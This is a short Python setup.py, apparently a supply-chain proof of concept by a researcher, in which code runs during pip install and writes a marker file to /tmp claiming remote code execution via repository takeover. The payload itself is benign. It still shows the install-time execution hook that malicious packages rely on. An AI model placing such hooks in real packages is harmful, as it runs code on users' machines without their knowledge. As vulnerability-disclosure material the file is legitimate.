from setuptools import setup
import os

# Create proof
with open(f"/tmp/SUPPLY_CHAIN_POC_BY_TALHAKHAN.txt", "w") as f:
    f.write("SUPPLY CHAIN ATTACK POC BY TALHAKHAN\n")
    f.write("Proof: Code executed during pip install\n")
    f.write(f"Time: {__import__('datetime').datetime.now()}\n")
    f.write("Vulnerability: pip install from GitHub URL\n")
    f.write("Impact: RCE via repository takeover\n")

setup(name='talhakhan-poc', version='0.1.0')
